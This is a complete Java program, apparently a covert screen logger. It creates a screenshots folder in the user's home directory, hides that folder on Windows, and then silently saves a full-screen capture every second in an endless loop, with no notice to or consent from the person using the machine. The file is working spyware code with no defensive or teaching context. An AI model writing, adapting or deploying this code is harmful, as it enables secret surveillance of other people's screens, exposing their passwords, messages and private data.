import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

public class Main {
	public static void main(String[] args) throws InterruptedException, IOException {
		
		String path = System.getProperty("user.home") + "/.screenshots/";
		File f = new File(path);
		
		// Creates the directory of screenshots if there isn't already one
		if (!(f.exists() && f.isDirectory())) {
			new File(path).mkdirs();
		}
		
		// Checks if the operating system is windows, and hides the folder of screenshots
		if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) {
			Path p = FileSystems.getDefault().getPath(path);
			Files.setAttribute(p, "dos:hidden", true);			
		}

		// Takes screenshots every second and saves it to the hidden folder
		while (true) {
			try {
				Thread.sleep(1000);
				DateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd___HH_mm_ss");
				Date date = new Date();
				BufferedImage image = new Robot()
						.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
				ImageIO.write(image, "png", new File(path + String.valueOf(dateFormat.format(date)) + ".png"));
			} catch (HeadlessException | AWTException | IOException e) {
				e.printStackTrace();
			}
		}
	}

}
